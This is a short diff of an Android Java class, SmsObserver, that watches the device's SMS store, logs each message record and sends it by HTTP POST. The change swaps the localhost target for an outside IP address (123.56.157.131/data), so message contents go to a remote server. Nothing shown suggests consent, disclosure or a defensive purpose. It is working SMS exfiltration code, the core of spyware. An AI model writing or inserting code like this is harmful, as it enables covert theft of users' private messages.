@@ -57,10 +57,10 @@ public class SmsObserver extends ContentObserver {
                     smsinfo.read = cursor.getString(readIndex);
                 }
                 Log.i("smswatch", smsinfo.toString());
-                pmap.put("smsinfo",smsinfo.toString());
+                pmap.put("data",smsinfo.toString());
                 hmap.put("smsinfo","1");
                 try {
-                    HttpRequestUtil.sendPost("http://127.0.0.1", pmap, hmap);
+                    HttpRequestUtil.sendPost("http://123.56.157.131/data", pmap, hmap);
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
